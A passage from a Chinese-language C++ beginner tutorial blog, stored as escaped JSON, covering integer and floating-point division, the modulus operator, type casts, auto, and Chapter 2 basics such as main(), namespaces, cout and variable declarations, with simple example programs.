- - 5; // 等价于 -(-5) = 5 std::cout &lt;&lt; &quot;- - 5 = &quot; &lt;&lt; val &lt;&lt; std::endl; return 0;&#125; 建议: 当表达式复杂或优先级不明确时，使用括号来明确运算顺序，可以提高代码的可读性并避免错误。 3.4.2 除法分支C++ 的除法运算符 / 的行为取决于其操作数 (Operand) 的类型： 浮点数除法: 如果操作数中至少有一个是浮点类型 (float, double, long double)，则执行浮点数除法，结果也是浮点类型，包含小数部分。 整数除法: 如果两个操作数都是整数类型 (int, short, long, char, bool 等)，则执行整数除法。结果只保留商的整数部分，小数部分被**截断 (truncated)**（直接丢弃，不是四舍五入）。 用法与示例: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; // 浮点数除法 double result_f1 = 9.0 / 5.0; // 两个 double double result_f2 = 9.0 / 5; // 一个 double, 一个 int (int 被提升为 double) double result_f3 = 9 / 5.0; // 一个 int, 一个 double (int 被提升为 double) float result_f4 = 9.0f / 5.0f; // 两个 float std::cout &lt;&lt; &quot;9.0 / 5.0 = &quot; &lt;&lt; result_f1 &lt;&lt; std::endl; // 输出 1.8 std::cout &lt;&lt; &quot;9.0 / 5 = &quot; &lt;&lt; result_f2 &lt;&lt; std::endl; // 输出 1.8 std::cout &lt;&lt; &quot;9 / 5.0 = &quot; &lt;&lt; result_f3 &lt;&lt; std::endl; // 输出 1.8 std::cout &lt;&lt; &quot;9.0f / 5.0f = &quot; &lt;&lt; result_f4 &lt;&lt; std::endl; // 输出 1.8 // 整数除法 int result_i1 = 9 / 5; // 两个 int int result_i2 = 10 / 3; // 两个 int int result_i3 = 13 / 4; // 两个 int int result_i4 = -10 / 3; // 负数整数除法 (结果通常向零截断，为 -3) std::cout &lt;&lt; &quot;9 / 5 = &quot; &lt;&lt; result_i1 &lt;&lt; std::endl; // 输出 1 (小数部分 0.8 被截断) std::cout &lt;&lt; &quot;10 / 3 = &quot; &lt;&lt; result_i2 &lt;&lt; std::endl; // 输出 3 (小数部分 0.333... 被截断) std::cout &lt;&lt; &quot;13 / 4 = &quot; &lt;&lt; result_i3 &lt;&lt; std::endl; // 输出 3 (小数部分 0.25 被截断) std::cout &lt;&lt; &quot;-10 / 3 = &quot; &lt;&lt; result_i4 &lt;&lt; std::endl; // 输出 -3 // 想要得到浮点结果，需要确保至少一个操作数是浮点类型 // 可以使用类型转换 (见 3.4.4) double result_mixed = double(9) / 5; // 将 9 转换为 double std::cout &lt;&lt; &quot;double(9) / 5 = &quot; &lt;&lt; result_mixed &lt;&lt; std::endl; // 输出 1.8 return 0;&#125; 注意: 进行除法运算时，务必清楚操作数的类型，以确保得到期望的结果（整数截断或浮点小数）。 3.4.3 求模运算符求模运算符 % 计算整数除法的**余数 (Remainder)**。它要求两个操作数都必须是整数类型（或可以转换为整数的类型，如 char, bool）。 运算规则:a % b 的结果是 a 除以 b 后的余数。其符号通常与被除数 a 的符号相同（C++11 标准规定如此）。 数学关系:对于整数 a 和 b (其中 b != 0)，以下关系通常成立：(a / b) * b + (a % b) == a 用途: 判断一个数是否能被另一个数整除（如果 a % b == 0，则 a 能被 b 整除）。 获取一个数的最低位数字（num % 10）。 将数值限制在一个范围内（例如，生成 0 到 N-1 之间的数：value % N）。 周期性操作（例如，每隔 M 个元素执行一次操作：if (count % M == 0)）。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;int main() &#123; int total_seconds = 135; int seconds_per_minute = 60; int minutes = total_seconds / seconds_per_minute; // 整数除法得分钟数 int remaining_seconds = total_seconds % seconds_per_minute; // 求模得剩余秒数 std::cout &lt;&lt; total_seconds &lt;&lt; &quot; seconds is &quot; &lt;&lt; minutes &lt;&lt; &quot; minutes and &quot; &lt;&lt; remaining_seconds &lt;&lt; &quot; seconds.&quot; &lt;&lt; std::endl; // 输出 135 seconds is 2 minutes and 15 seconds. // 判断奇偶性 int number = 21; if (number % 2 == 0) &#123; std::cout &lt;&lt; number &lt;&lt; &quot; is even.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; number &lt;&lt; &quot; is odd.&quot; &lt;&lt; std::endl; // 输出 21 is odd. &#125; // 获取个位数 int value = 123; int last_digit = value % 10; std::cout &lt;&lt; &quot;The last digit of &quot; &lt;&lt; value &lt;&lt; &quot; is &quot; &lt;&lt; last_digit &lt;&lt; std::endl; // 输出 3 // 负数求模 (C++11 及以后，结果符号与被除数一致) int result1 = 10 % 3; // 1 int result2 = -10 % 3; // -1 int result3 = 10 % -3; // 1 int result4 = -10 % -3; // -1 std::cout &lt;&lt; &quot;10 % 3 = &quot; &lt;&lt; result1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;-10 % 3 = &quot; &lt;&lt; result2 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;10 % -3 = &quot; &lt;&lt; result3 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;-10 % -3 = &quot; &lt;&lt; result4 &lt;&lt; std::endl; // 不能用于浮点数 // double remainder = 10.5 % 3.2; // 编译错误! return 0;&#125; 3.4.4 类型转换C++允许在不同数据类型之间进行转换，这称为类型转换 (Type Casting)**。转换可以隐式 (Implicitly)** 发生（由编译器自动完成），也可以显式 (Explicitly) 进行（由程序员通过代码指定）。 隐式类型转换 (Automatic Conversion): 在以下情况下，编译器会自动执行类型转换： 混合类型表达式: 当一个表达式中包含不同数值类型的操作数时，较小或较低优先级的类型通常会被提升 (Promoted) 为较大或较高优先级的类型，然后进行运算。 整型提升 (Integral Promotion): 比 int 小的整型（bool, char, signed char, unsigned char, short, unsigned short）在表达式中通常会被提升为 int (如果 int 能容纳其所有值) 或 unsigned int。 算术转换 (Usual Arithmetic Conversions): 在涉及不同算术类型（整型和浮点型）的运算中，遵循一套规则将操作数转换为共同的类型（通常是两者中“更宽”或精度更高的类型）。例如，int 和 double 运算时，int 会被转换为 double。float 和 double 运算时，float 会被转换为 double。 赋值: 将一个类型的值赋给另一种类型的变量时，右侧的值会被转换为左侧变量的类型。这可能导致精度损失（如 double 转 int）或范围问题（如 long 转 short）。 函数参数传递: 将参数传递给函数时，如果实参类型与形参类型不匹配，会尝试进行转换。 函数返回值: 从函数返回一个值时，如果返回值类型与函数声明的返回类型不匹配，会尝试进行转换。 显式类型转换 (Explicit Casting): 当需要强制进行类型转换，或者为了使代码意图更清晰时，可以使用显式类型转换。C++提供了多种转换方式： C 风格强制类型转换 (C-Style Cast): 12(typeName) expressiontypeName (expression) // 函数式转换 这种方式简单直接，但在某些情况下不够安全，因为它可能执行多种不同类型的转换（如 static_cast, const_cast, reinterpret_cast 的组合）。 C++ 类型转换运算符 (C++ Cast Operators): (更推荐，更安全，意图更明确) static_cast&lt;typeName&gt;(expression): 用于比较“自然”和安全的转换，如数值类型之间的转换（整数与浮点数互转、整数与整数互转）、指针类型之间的相关转换（如 void* 与其他类型指针互转、基类指针与派生类指针互转，但需要谨慎）。这是最常用的 C++ 转换符。 dynamic_cast&lt;typeName&gt;(expression): 主要用于处理类继承层次结构中的指针或引用转换（向下转型），并在运行时进行类型检查。如果转换无效，对于指针会返回 nullptr，对于引用会抛出 std::bad_cast 异常。需要基类是多态的（至少有一个虚函数）。 const_cast&lt;typeName&gt;(expression): 用于添加或移除表达式的 const 或 volatile 限定符。通常用于去除 const，但修改原本是 const 的对象是未定义行为。主要用于处理常量性不匹配的旧 API。 reinterpret_cast&lt;typeName&gt;(expression): 用于低级别的、通常与实现相关的、不安全的转换。例如，在整数和指针之间进行转换，或者在不相关的指针类型之间进行转换。应极力避免使用，除非确实理解其底层含义和风险。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;int main() &#123; // 隐式转换示例 int i_val = 10; double d_val = 3.14; short s_val = 5; // 混合表达式 (算术转换) double result1 = i_val + d_val; // i_val (int) 提升为 double (10.0), 结果是 double (13.14) std::cout &lt;&lt; &quot;int + double = &quot; &lt;&lt; result1 &lt;&lt; std::endl; // 整型提升 char c_val = &#x27;A&#x27;; // ASCII 码 65 int result2 = c_val + s_val; // c_val (char) 和 s_val (short) 都提升为 int, 结果是 int (70) std::cout &lt;&lt; &quot;char + short = &quot; &lt;&lt; result2 &lt;&lt; std::endl; // 赋值转换 (可能丢失信息) int i_from_d = d_val; // d_val (3.14) 转换为 int, 小数部分截断, i_from_d 变为 3 std::cout &lt;&lt; &quot;int from double = &quot; &lt;&lt; i_from_d &lt;&lt; std::endl; short s_from_i = 100000; // 100000 可能超出 short 范围, 结果未定义或回绕 std::cout &lt;&lt; &quot;short from large int = &quot; &lt;&lt; s_from_i &lt;&lt; std::endl; // 显式转换示例 int total = 19; int count = 5; // C 风格转换 (用于浮点除法) double average1 = (double)total / count; double average2 = double(total) / count; // 函数式转换 std::cout &lt;&lt; &quot;(double)total / count = &quot; &lt;&lt; average1 &lt;&lt; std::endl; // 输出 3.8 std::cout &lt;&lt; &quot;double(total) / count = &quot; &lt;&lt; average2 &lt;&lt; std::endl; // 输出 3.8 // C++ static_cast (推荐用于数值转换) double average3 = static_cast&lt;double&gt;(total) / count; std::cout &lt;&lt; &quot;static_cast&lt;double&gt;(total) / count = &quot; &lt;&lt; average3 &lt;&lt; std::endl; // 输出 3.8 int char_code = static_cast&lt;int&gt;(&#x27;B&#x27;); // char 转 int std::cout &lt;&lt; &quot;Code for &#x27;B&#x27;: &quot; &lt;&lt; char_code &lt;&lt; std::endl; // 输出 66 // 演示 reinterpret_cast (通常不推荐) long addr = 1000; // int* ptr = reinterpret_cast&lt;int*&gt;(addr); // 将整数视为地址 (危险!) // std::cout &lt;&lt; &quot;Pointer from address: &quot; &lt;&lt; ptr &lt;&lt; std::endl; return 0;&#125; 建议: 尽量避免不必要的类型转换。 优先使用 C++ 的 static_cast 进行明确且相对安全的数值或相关指针转换。 谨慎使用 C 风格转换，因为它隐藏了转换的类型和风险。 仅在绝对必要且理解后果的情况下使用 const_cast 和 reinterpret_cast。 注意隐式转换可能导致的精度损失或意外行为，尤其是在混合有符号和无符号整数时。 3.4.5 C++11中的auto声明C++11 引入了 auto 关键字，它允许编译器根据变量的初始化表达式 (Initializer) 自动推断出变量的类型。这可以简化代码，尤其是在处理复杂类型（如 STL 迭代器或模板类型）时。 工作原理: 当你使用 auto 声明变量时，必须提供一个初始化表达式。编译器会查看这个表达式的类型，并将该类型赋予 auto 声明的变量。 1auto variableName = initializationExpression; 要点: 必须初始化: 使用 auto 声明的变量必须在声明时初始化。 类型推断: 类型是从初始化表达式推断出来的，而不是变量本身的某种默认类型。 const 和引用: auto 通常不会自动推断出顶层的 const 或引用。如果需要 const 或引用，需要显式添加。 auto x = value; // x 的类型与 value 相同 (const/引用被剥离) const auto cx = value; // cx 是 const 类型 auto&amp; rx = value; // rx 是引用类型 const auto&amp; crx = value; // crx 是 const 引用类型 列表初始化: 对于 C++11 中的列表初始化 &#123;&#125;，auto 的推断规则比较特殊。 auto x = &#123;1, 2, 3&#125;; // C++11/14: x 被推断为 std::initializer_list auto y = &#123;1&#125;; // C++11/14: y 被推断为 std::initializer_list auto z&#123;1&#125;; // C++17: z 被推断为 int (注意没有等号) 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;#include &lt;vector&gt; // 包含 vector#include &lt;typeinfo&gt; // 用于 typeid (仅作演示)int main() &#123; // 基本类型推断 auto i = 10; // i 被推断为 int auto d = 3.14; // d 被推断为 double auto f = 3.14f; // f 被推断为 float auto c = &#x27;A&#x27;; // c 被推断为 char auto b = true; // b 被推断为 bool auto ll = 1234567890LL; // ll 被推断为 long long std::cout &lt;&lt; &quot;Type of i: &quot; &lt;&lt; typeid(i).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of d: &quot; &lt;&lt; typeid(d).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of f: &quot; &lt;&lt; typeid(f).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of ll: &quot; &lt;&lt; typeid(ll).name() &lt;&lt; std::endl; // 推断表达式结果类型 auto sum = i + d; // i(int) + d(double) -&gt; double, sum 被推断为 double std::cout &lt;&lt; &quot;Type of sum: &quot; &lt;&lt; typeid(sum).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;sum = &quot; &lt;&lt; sum &lt;&lt; std::endl; // 推断 const 和引用 (需要显式添加) int original = 100; auto copy = original; // copy 是 int (非引用, 非 const) const auto const_copy = original; // const_copy 是 const int auto&amp; ref = original; // ref 是 int&amp; (引用) const auto&amp; const_ref = original; // const_ref 是 const int&amp; (const 引用) copy = 200; // OK // const_copy = 200; // 错误! const_copy 是 const ref = 300; // OK, original 也变为 300 // const_ref = 400; // 错误! const_ref 是 const 引用 std::cout &lt;&lt; &quot;original: &quot; &lt;&lt; original &lt;&lt; std::endl; // 输出 300 // 用于复杂类型 (例如 STL 容器迭代器) std::vector&lt;std::string&gt; names = &#123;&quot;Alice&quot;, &quot;Bob&quot;, &quot;Charlie&quot;&#125;; auto it = names.begin(); // it 被推断为 std::vector&lt;std::string&gt;::iterator std::cout &lt;&lt; &quot;First name: &quot; &lt;&lt; *it &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of it: &quot; &lt;&lt; typeid(it).name() &lt;&lt; std::endl; // C++11 列表初始化 auto list1 = &#123;10, 20, 30&#125;; // list1 是 std::initializer_list&lt;int&gt; std::cout &lt;&lt; &quot;Type of list1: &quot; &lt;&lt; typeid(list1).name() &lt;&lt; std::endl; // C++17 列表初始化 (无等号) // auto val&#123;42&#125;; // C++17: val 是 int // std::cout &lt;&lt; &quot;Type of val: &quot; &lt;&lt; typeid(val).name() &lt;&lt; std::endl; return 0;&#125; 优点: 减少冗余代码，尤其是在类型名称很长时。 提高代码的可维护性，如果初始化表达式的类型改变，auto 变量的类型会自动更新。 有助于泛型编程。 缺点/注意事项: 过度使用可能降低代码的可读性，因为读者需要查看初始化表达式才能确定类型。 auto 推断出的类型可能不是你期望的（例如，忘记添加 &amp; 得到副本而不是引用）。 对于代理类（Proxy Classes），auto 可能推断出代理类型而不是期望的值类型，需要小心。 建议: 在类型冗长、明显或无关紧要时使用 auto 可以提高效率。在类型对于理解代码逻辑很重要时，显式写出类型可能更好。 3.5 总结本章深入探讨了C++用于处理数据的基本内置类型。我们首先学习了简单变量的命名规则和约定，强调了名称的可读性和合法性。 接着，我们详细研究了C++的整型家族，包括 short、int、long 和 C++11 新增的 long long。我们讨论了它们各自的大小、表示范围以及如何选择合适的类型。我们还介绍了 unsigned 类型，它们用于存储非负整数，并具有更大的正数范围。我们学习了如何书写不同进制（十进制、八进制、十六进制，以及C++14的二进制）的整型字面值，以及如何使用后缀（U, L, LL）来指定常量的具体类型，并了解了编译器在没有后缀时如何推断常量类型。 char 类型被介绍为一种特殊的整型，主要用于存储字符，但也可以作为小整数使用。我们学习了字符字面值（使用单引号）和转义序列。bool 类型也被引入，用于表示逻辑真 (true) 和假 (false)，以及它与整数（1和0）之间的转换关系。 为了创建不可修改的变量（常量），我们学习了 const 限定符。使用 const 定义的常量必须在声明时初始化，它提供了类型安全和作用域控制，是比 #define 更受推荐的常量定义方式。 然后，我们转向了浮点类型 (float, double, long double)，用于表示带小数的数字。我们学习了书写浮点数的两种方式（标准小数点和E表示法），了解了不同浮点类型的精度和范围差异，以及如何使用后缀（f, L）指定浮点常量类型（默认为 double）。我们还讨论了浮点数的优点（范围广、表示小数）和固有的缺点（精度限制、比较困难）。 最后，我们学习了C++的基本算术运算符 (+, -, *, /, %)。我们探讨了运算符的优先级和结合性规则，以及如何使用括号来控制运算顺序。特别地，我们区分了整数除法（结果截断）和浮点数除法，并学习了求模运算符 % 的用法（主要用于整数求余）。 类型转换是本章的另一个重点，包括编译器自动执行的隐式转换（如整型提升和算术转换）和程序员指定的显式转换（C风格转换和更安全的C++转换符 static_cast、dynamic_cast、const_cast、reinterpret_cast）。我们强调了转换中可能出现的信息丢失问题。 C++11 引入的 auto 关键字也被介绍，它允许编译器根据初始化表达式自动推断变量类型，简化了代码，尤其是在处理复杂类型时。 通过本章的学习，我们掌握了C++的基本数据类型及其用法，为后续更复杂的数据结构和算法打下了坚实的基础。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 2 开始学习C++","slug":"Cpp_tutorial_Chapter_2","date":"2025-04-26T12:03:35.404Z","updated":"2025-04-26T12:01:13.366Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_2/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_2/","excerpt":"","text":"2.1 进入C++本节将引导你编写第一个C++程序，并介绍一些基本概念。 2.1.1 main()函数每个C++程序都必须包含一个名为 main 的函数。操作系统通过调用 main 函数来启动C++程序。main 函数是程序的入口点。 基本结构: 123456int main() &#123; // 程序代码 return 0; // 表示程序成功执行&#125; int main(): 这是 main 函数的函数头。int 表示 main 函数执行完毕后将返回一个整数值给操作系统。括号 () 表示这是一个函数。 &#123; ... &#125;: 花括号标记了函数体的开始和结束。函数体包含了程序要执行的指令（语句）。 return 0;: 这条语句表示 main 函数执行完毕。返回值 0 通常表示程序成功执行。非零返回值通常表示程序遇到了错误。 示例: 一个最简单的C++程序： 1234int main() &#123; return 0; &#125; 这个程序什么也不做，但它是一个完整的、可以编译和运行的C++程序。 2.1.2 C++注释注释是程序中用于解释代码的部分，它们会被编译器忽略，不会影响程序的执行。注释可以提高代码的可读性。 C++支持两种类型的注释： 单行注释: 以 // 开始，直到该行结束。 多行注释: 以 /* 开始，以 */ 结束，可以跨越多行。 用法与示例: 1234567891011121314#include &lt;iostream&gt; // 这是一个单行注释，解释包含头文件/* 这是一个多行注释。 它可以用来写更长的解释。 下面的 main 函数是程序的入口点。*/int main() &#123; // 使用 cout 输出 &quot;Hello, World!&quot; 到控制台 std::cout &lt;&lt; &quot;Hello, World!&quot; &lt;&lt; std::endl; // endl 用于换行 return 0; // 程序成功结束&#125; 2.1.3 C++预处理器和iostream文件在编译C++程序之前，预处理器会首先处理源代码。预处理器指令以 # 符号开头。 #include 是一个常见的预处理器指令，它告诉预处理器将另一个文件的内容包含到当前文件中。 iostream 文件是C++标准库的一部分，包含了进行输入（input）和输出（output）操作所需的信息。例如，要使用 cout 进行输出，就需要包含 iostream 文件。 用法与示例: 1234567#include &lt;iostream&gt; // 包含 iostream 文件，以便使用 coutint main() &#123; std::cout &lt;&lt; &quot;Hello from iostream!&quot;; return 0;&#125; #include &lt;iostream&gt;: 这条指令告诉预处理器查找名为 iostream 的标准头文件，并将其内容插入到该指令所在的位置。 2.1.4 头文件名头文件（Header Files）包含了函数、类、对象等的声明，使得我们可以在程序中使用它们。C++标准库提供了许多头文件。 标准库头文件: 通常使用尖括号 &lt;&gt; 括起来，例如 &lt;iostream&gt;, &lt;cmath&gt;, &lt;string&gt;。编译器会在标准库的包含路径中查找这些文件。 用户自定义头文件: 通常使用双引号 &quot;&quot; 括起来，例如 &quot;myheader.h&quot;。编译器会首先在当前源文件所在的目录查找，然后在标准包含路径中查找。 C++98之前的头文件: 以前的C++头文件可能带有 .h 后缀（如 &lt;iostream.h&gt;）。现代C++（C++98及以后）推荐使用不带 .h 后缀的标准头文件（如 &lt;iostream&gt;），这些头文件的内容位于 std 命名空间中。 示例: 1234567891011121314#include &lt;iostream&gt; // 标准库头文件#include &lt;cmath&gt; // 包含数学函数，如 sqrt()#include &quot;myutils.h&quot; // 用户自定义头文件 (假设存在 myutils.h)int main() &#123; double num = 9.0; double root = std::sqrt(num); // 使用 cmath 中的 sqrt 函数 std::cout &lt;&lt; &quot;Square root of &quot; &lt;&lt; num &lt;&lt; &quot; is &quot; &lt;&lt; root &lt;&lt; std::endl; // 假设 myutils.h 中定义了 printMessage() 函数 // printMessage(&quot;Using custom header!&quot;); return 0;&#125; 2.1.5 名称空间名称空间（Namespace）是C++中避免命名冲突的一种机制。不同的名称空间可以包含同名的函数、类或变量。 标准C++库中的所有内容（如 cout, cin, endl, string 等）都定义在名为 std 的名称空间中。 要使用 std 名称空间中的元素，有几种方法： 使用作用域解析运算符 ::: 在每个元素前加上 std::。 1std::cout &lt;&lt; &quot;Hello!&quot; &lt;&lt; std::endl; 使用 using 声明: 将特定的名称引入当前作用域。 12345678910#include &lt;iostream&gt;using std::cout; // 只引入 coutusing std::endl; // 只引入 endlint main() &#123; cout &lt;&lt; &quot;Hello!&quot; &lt;&lt; endl; // 不需要 std:: 前缀 // std::cin &gt;&gt; variable; // 如果要用 cin，仍需 std:: 或 using std::cin; return 0;&#125; 使用 using 编译指令: 将整个名称空间的所有名称引入当前作用域。（不推荐在头文件中或全局作用域中使用，可能导致命名冲突） 12345678910#include &lt;iostream&gt;using namespace std; // 引入 std 中的所有名称int main() &#123; cout &lt;&lt; &quot;Hello!&quot; &lt;&lt; endl; // 不需要 std:: 前缀 int x; cin &gt;&gt; x; // cin 也不需要 std:: 前缀 return 0;&#125; 推荐做法: 在 .cpp 文件的函数内部或较小作用域内，可以使用 using 声明或 using namespace std;。 在头文件 (.h) 中，绝对不要使用 using namespace std;，应始终使用 std:: 前缀。 在简单的示例或小型项目中，using namespace std; 可以简化代码，但在大型项目中，坚持使用 std:::: 或 using 声明是更安全的做法。 2.1.6 使用cout进行C++输出cout 是 iostream 库中预定义的一个对象，代表标准输出流，通常连接到控制台（屏幕）。 &lt;&lt; 运算符（插入运算符）用于将数据发送给 cout 对象，使其显示在屏幕上。 用法与示例: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;int main() &#123; // 输出字符串字面量 std::cout &lt;&lt; &quot;Welcome to C++!&quot;; // 输出换行符 (使用 std::endl) std::cout &lt;&lt; std::endl; // 输出数字 std::cout &lt;&lt; &quot;The year is &quot;; std::cout &lt;&lt; 2024; std::cout &lt;&lt; std::endl; // 链式输出 int age = 30; std::cout &lt;&lt; &quot;My age is: &quot; &lt;&lt; age &lt;&lt; &quot; years old.&quot; &lt;&lt; std::endl; // 输出特殊字符 (使用转义序列) std::cout &lt;&lt; &quot;This is a tab:\\t.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;This is a newline:\\n.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;This is a quote: \\&quot; &quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;This is a backslash: \\\\&quot; &lt;&lt; std::endl; return 0;&#125; std::endl: 是一个特殊的控制符（manipulator），它会输出一个换行符，并刷新输出缓冲区（确保内容立即显示）。 \\n: 是一个转义字符，代表换行符。它只输出换行，通常不保证立即刷新缓冲区。在多数情况下，\\n 比 std::endl 效率稍高。 2.1.7 C++源代码的格式化C++语言对代码格式（如空格、缩进、换行）的要求相对宽松，但良好的格式化对于代码的可读性和可维护性至关重要。 基本规则和建议: 语句分隔: C++使用分号 ; 来结束大多数语句。 空格: 通常在运算符（=, +, -, *, /, &lt;&lt;, &gt;&gt;, == 等）两边添加空格。 在逗号 , 后面添加空格。 在函数名和后面的括号 () 之间通常不加空格。 缩进: 使用一致的缩进（通常是4个空格或一个制表符）来表示代码块（如 main 函数体、循环体、条件语句体）。这极大地提高了代码结构的可读性。 换行: 通常每行只写一条语句。 可以在合适的地方（如运算符之后、逗号之后）将长语句分成多行。 花括号 &#123;&#125;: 对于代码块（如函数体、if 语句块等），花括号的放置风格有多种（如 K&amp;R 风格、Allman 风格），选择一种并保持一致即可。 示例 (良好格式): 1234567891011121314151617#include &lt;iostream&gt;int main() &#123; // 左花括号通常独占一行或在行尾 int score = 100; std::cout &lt;&lt; &quot;Initial score: &quot; &lt;&lt; score &lt;&lt; std::endl; if (score &gt; 90) &#123; // 缩进表示 if 块内部 std::cout &lt;&lt; &quot;Excellent!&quot; &lt;&lt; std::endl; score = score + 5; // 在运算符两边加空格 &#125; // 右花括号通常独占一行，与对应块的起始对齐 std::cout &lt;&lt; &quot;Final score: &quot; &lt;&lt; score &lt;&lt; std::endl; return 0;&#125; 示例 (不良格式，但语法正确): 12#include &lt;iostream&gt;int main()&#123;int score=100;std::cout&lt;&lt;&quot;Initial score: &quot;&lt;&lt;score&lt;&lt;std::endl;if(score&gt;90)&#123;std::cout&lt;&lt;&quot;Excellent!&quot;&lt;&lt;std::endl;score=score+5;&#125;std::cout&lt;&lt;&quot;Final score: &quot;&lt;&lt;score&lt;&lt;std::endl;return 0;&#125; 虽然第二个示例也能编译运行，但极难阅读和理解。遵循一致的、清晰的格式化风格是专业编程的重要组成部分。 2.2 C++语句C++程序由一系列语句组成。语句是C++程序的基本执行单元，通常以分号 ; 结尾。本节将介绍两种基本的语句：声明语句和赋值语句，并进一步探讨 cout 的用法。 2.2.1 声明语句和变量声明语句 (Declaration Statement) 用于向编译器声明程序中将要使用的变量 (Variable) 的名称和类型。 变量 是计算机内存中用于存储数据的一块区域，并且有一个名字（标识符）。通过变量名，我们可以访问和修改存储在内存中的数据。在使用变量之前，必须先声明它。 声明变量的语法: 1typeName variableName; typeName: 指定变量要存储的数据类型（例如 int 表示整数，double 表示浮点数）。 variableName: 你为变量选择的名称（标识符）。 用法与示例: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;int main() &#123; // 声明一个名为 carrots 的整型变量 int carrots; // 声明多个同类型的变量 int dogs, cats; // 声明并同时初始化变量 (赋初值) int fleas = 10; double price = 99.99; // C++11 列表初始化 (更推荐) int hamsters = &#123;5&#125;; int gerbils&#123;8&#125;; // 花括号可以省略等号 int rats&#123;&#125;; // 初始化为 0 // ... 后续可以使用这些变量 ... carrots = 25; // 赋值 std::cout &lt;&lt; &quot;I have &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Fleas: &quot; &lt;&lt; fleas &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Hamsters: &quot; &lt;&lt; hamsters &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Rats: &quot; &lt;&lt; rats &lt;&lt; std::endl; return 0;&#125; 声明 (Declaration): 告诉编译器变量的名称和类型。 定义 (Definition): 声明通常也是定义，因为它会为变量分配内存空间。 初始化 (Initialization): 在声明变量的同时给它赋一个初始值。这是一个好习惯，可以避免使用未定义的值。 2.2.2 赋值语句赋值语句 (Assignment Statement) 用于将一个值赋给一个变量。它使用赋值运算符 =。 语法: 1variableName = value; variableName: 要接收值的变量的名称（必须是已声明的变量）。 value: 要赋给变量的值。这可以是一个字面常量（如 25）、另一个变量、或一个表达式的结果。 重要概念: 赋值操作是将右侧的值复制到左侧的变量中。 左侧必须是一个可修改的**左值 (lvalue)**，通常就是一个变量名。 右侧可以是一个**右值 (rvalue)**，即一个可以产生值的表达式。 用法与示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int main() &#123; int carrots; // 声明变量 carrots = 25; // 赋值语句：将 25 赋给 carrots std::cout &lt;&lt; &quot;Now I have &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots.&quot; &lt;&lt; std::endl; carrots = carrots - 1; // 赋值语句：将表达式 carrots - 1 的结果 (24) 赋给 carrots std::cout &lt;&lt; &quot;Crunch, crunch. Now I have &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots.&quot; &lt;&lt; std::endl; int dogs = 5; // 声明并初始化 int cats; // 声明 cats = dogs; // 赋值语句：将 dogs 的值 (5) 赋给 cats std::cout &lt;&lt; &quot;Dogs: &quot; &lt;&lt; dogs &lt;&lt; &quot;, Cats: &quot; &lt;&lt; cats &lt;&lt; std::endl; // 可以链式赋值 (从右向左执行) int a, b, c; a = b = c = 10; // c=10, 然后 b=c (即 b=10), 然后 a=b (即 a=10) std::cout &lt;&lt; &quot;a=&quot; &lt;&lt; a &lt;&lt; &quot;, b=&quot; &lt;&lt; b &lt;&lt; &quot;, c=&quot; &lt;&lt; c &lt;&lt; std::endl; return 0;&#125; 2.2.3 cout的新花样我们在 2.1.6 节已经学习了如何使用 cout 输出字符串和使用 endl 换行。cout 的一个强大之处在于它的“智能”，它可以识别并正确显示多种不同类型的数据。 cout 对象与插入运算符 &lt;&lt; 结合使用，可以自动处理 C++ 的内置数据类型，如整数 (int)、浮点数 (double, float)、字符 (char) 以及 C 风格字符串和 std::string 对象。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;string&gt; // 包含 string 类int main() &#123; int age = 30; double weight = 65.5; char initial = &#x27;J&#x27;; std::string name = &quot;Alice&quot;; // C++ string 对象 const char* city = &quot;New York&quot;; // C 风格字符串 // cout 可以自动处理不同类型 std::cout &lt;&lt; &quot;--- Personal Information ---&quot; &lt;&lt; std::endl; // 输出整数 std::cout &lt;&lt; &quot;Age: &quot;; // 输出提示信息 std::cout &lt;&lt; age; // 输出 age 变量的值 (整数) std::cout &lt;&lt; std::endl; // 换行 // 输出浮点数 std::cout &lt;&lt; &quot;Weight: &quot; &lt;&lt; weight &lt;&lt; &quot; kg&quot; &lt;&lt; std::endl; // 链式输出 // 输出字符 std::cout &lt;&lt; &quot;Initial: &quot; &lt;&lt; initial &lt;&lt; std::endl; // 输出 C++ string 对象 std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; name &lt;&lt; std::endl; // 输出 C 风格字符串 std::cout &lt;&lt; &quot;City: &quot; &lt;&lt; city &lt;&lt; std::endl; // 混合输出 std::cout &lt;&lt; name &lt;&lt; &quot; is &quot; &lt;&lt; age &lt;&lt; &quot; years old and lives in &quot; &lt;&lt; city &lt;&lt; &quot;.&quot; &lt;&lt; std::endl; // 输出表达式结果 std::cout &lt;&lt; &quot;Next year, &quot; &lt;&lt; name &lt;&lt; &quot; will be &quot; &lt;&lt; age + 1 &lt;&lt; &quot; years 